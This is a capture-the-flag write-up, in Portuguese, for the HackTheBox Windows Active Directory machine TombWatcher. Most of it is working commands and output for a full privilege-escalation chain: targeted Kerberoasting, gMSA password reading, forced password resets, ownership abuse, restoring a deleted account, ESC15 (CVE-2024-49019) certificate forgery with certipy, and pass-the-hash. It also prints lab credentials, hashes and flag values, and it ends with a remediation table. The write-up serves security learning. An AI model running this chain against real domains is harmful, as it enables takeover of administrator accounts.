---
title: "HTB — TombWatcher (Medium Windows AD): Kerberoast → gMSA → ESC15 (CVE-2024-49019)"
date: 2026-05-19 10:00:00 +0000
categories: [Machines, HackTheBox]
tags: [hackthebox, windows, active-directory, kerberoast, gmsa, adcs, esc15, cve-2024-49019, certipy, pass-the-hash, medium]
---

**IP:** 10.129.232.167 | **Dificuldade:** Medium | **OS:** Windows Server 2019 DC | **Domínio:** tombwatcher.htb

## Resumo

Domain Controller com cadeia longa de abuso de permissões AD. Credencial inicial de henry permite WriteSPN sobre alfred → Targeted Kerberoast → crack da senha. Alfred usa AddSelf para entrar no grupo INFRASTRUCTURE → leitura da senha gMSA do ansible_devs. ansible_devs tem ForceChangePassword sobre sam → reset. sam tem WriteOwner sobre john → GenericAll → reset da senha. john tem GenericAll sobre a OU ADCS → restaura cert_admin do AD Recycle Bin. Com cert_admin, explora **ESC15 (CVE-2024-49019)**: template WebServer com `EnrolleeSuppliesSubject` e Schema Version 1 permite injetar política de Client Authentication → assina certificado como Administrator → Pass-the-Hash.

| Flag | Hash |
|------|------|
| user.txt | `a5e5731f9275238d9bf2ba9efe04f2b9` |
| root.txt | `9f963dd1c34012a0a9ae54316d954f71` |

---

## 1. Reconhecimento

```bash
nmap -sV -sC -T4 -Pn --open 10.129.232.167
echo "10.129.232.167 tombwatcher.htb DC01.tombwatcher.htb" | sudo tee -a /etc/hosts
```

**Credencial inicial:** `henry:H3nry_987TGV!`

---

## 2. Targeted Kerberoast (henry → alfred)

henry tem **WriteSPN** sobre alfred → torna alfred Kerberoastable:

```bash
python3 targetedKerberoast.py -d tombwatcher.htb -u henry -p 'H3nry_987TGV!' \
  --request-user alfred --dc-ip 10.129.232.167

hashcat -m 13100 alfred.hash rockyou.txt
# alfred:basketball
```

---

## 3. gMSA Read (alfred → ansible_devs)

alfred tem **AddSelf** no grupo **INFRASTRUCTURE**. Membros do INFRASTRUCTURE podem ler a senha do gMSA `ansible_dev`:

```bash
bloodyAD --host 'DC01.tombwatcher.htb' -d tombwatcher.htb \
  -u alfred -p basketball add groupMember INFRASTRUCTURE alfred

bloodyAD --host 'DC01.tombwatcher.htb' -d tombwatcher.htb \
  -u alfred -p basketball \
  get object 'CN=ansible_dev,CN=Managed Service Accounts,DC=tombwatcher,DC=htb' \
  --attr msDS-ManagedPassword
# NT: cba56cd2df7d642f622e2a59956f6d47
```

---

## 4. ForceChangePassword (ansible_devs → sam)

```bash
bloodyAD --host 'DC01.tombwatcher.htb' -d tombwatcher.htb \
  -u 'ansible_dev$' -p ':cba56cd2df7d642f622e2a59956f6d47' \
  set password sam 'Rogue@123!'
```

---

## 5. WriteOwner → GenericAll (sam → john) + User Flag

```bash
bloodyAD --host 'DC01.tombwatcher.htb' -d tombwatcher.htb \
  -u sam -p 'Rogue@123!' set owner john sam

bloodyAD --host 'DC01.tombwatcher.htb' -d tombwatcher.htb \
  -u sam -p 'Rogue@123!' add genericAll john sam

bloodyAD --host 'DC01.tombwatcher.htb' -d tombwatcher.htb \
  -u sam -p 'Rogue@123!' set password john 'Rogue@123!'

evil-winrm -i DC01.tombwatcher.htb -u john -p 'Rogue@123!'
type C:\Users\john\Desktop\user.txt
# a5e5731f9275238d9bf2ba9efe04f2b9
```

---

## 6. Restaurar cert_admin do AD Recycle Bin

john tem **GenericAll** sobre a OU **ADCS**. A conta `cert_admin` está deletada:

```powershell
Get-ADObject -Filter 'isDeleted -eq $true' -IncludeDeletedObjects `
  -Properties cn,LastKnownParent,ObjectGUID
# ObjectGUID: 938182c3-bf0b-410a-9aaa-45c8e1a02ebf (LastKnownParent: OU=ADCS)

Restore-ADObject -Identity "938182c3-bf0b-410a-9aaa-45c8e1a02ebf"
```

```bash
bloodyAD --host 'DC01.tombwatcher.htb' -d tombwatcher.htb \
  -u john -p 'Rogue@123!' set password cert_admin 'Rogue@123!'
```

---

## 7. ESC15 — CVE-2024-49019

O template **WebServer** tem:
- `EnrolleeSuppliesSubject = True`
- **Schema Version = 1** (sem restrição de Application Policy)
- Extended Key Usage = Server Authentication

Com Schema Version 1, é possível injetar OIDs de Application Policy arbitrários, incluindo **Client Authentication** (`1.3.6.1.4.1.311.20.2.1`) para Smart Card Logon.

**Passo 1 — Solicitar certificado com injeção de Client Auth:**

```bash
certipy req \
  -ca tombwatcher-CA-1 \
  -username cert_admin@tombwatcher.htb \
  -password 'Rogue@123!' \
  -dc-ip 10.129.232.167 \
  -template WebServer \
  -application-policies '1.3.6.1.4.1.311.20.2.1' \
  -target 10.129.232.167 \
  -out cert_admin
```

**Passo 2 — Solicitar certificado como Administrator:**

```bash
certipy req \
  -username cert_admin@tombwatcher.htb \
  -password 'Rogue@123!' \
  -dc-ip 10.129.232.167 \
  -ca tombwatcher-CA-1 \
  -template User \
  -on-behalf-of 'tombwatcher\administrator' \
  -pfx cert_admin.pfx \
  -out administrator
```

**Passo 3 — Auth e hash NTLM:**

```bash
certipy auth -dc-ip 10.129.232.167 -pfx administrator.pfx
# NT hash: f61db423bebe3328d33af26741afe5fc

evil-winrm -i DC01.tombwatcher.htb -u administrator \
  -H f61db423bebe3328d33af26741afe5fc

type C:\Users\Administrator\Desktop\root.txt
# 9f963dd1c34012a0a9ae54316d954f71
```

---

## Diagrama

```
henry (H3nry_987TGV!)
  ↓ WriteSPN → Targeted Kerberoast
alfred (basketball)
  ↓ AddSelf → INFRASTRUCTURE → gMSA Read
ansible_devs (NTLM: cba56cd2df7d642f622e2a59956f6d47)
  ↓ ForceChangePassword
sam (Rogue@123!)
  ↓ WriteOwner → GenericAll
john (Rogue@123!) → user.txt
  ↓ GenericAll over ADCS OU → Restore-ADObject
cert_admin (Rogue@123!)
  ↓ ESC15 (CVE-2024-49019) WebServer template Schema V1
administrator NTLM → PTH → root.txt
```

---

## Lições Aprendidas

| Vulnerabilidade | Remediação |
|-----------------|------------|
| WriteSPN sem restrição | Auditar quem tem WriteSPN; usar Kerberos pre-auth forte |
| gMSA password acessível a grupos desnecessários | Restringir PrincipalsAllowedToRetrieveManagedPassword |
| ESC15 (CVE-2024-49019) — Schema V1 + EnrolleeSuppliesSubject | Atualizar/desabilitar templates Schema Version 1 |
| AD Recycle Bin restaura contas privilegiadas | Monitorar restauração de objetos; purgar contas desnecessárias |
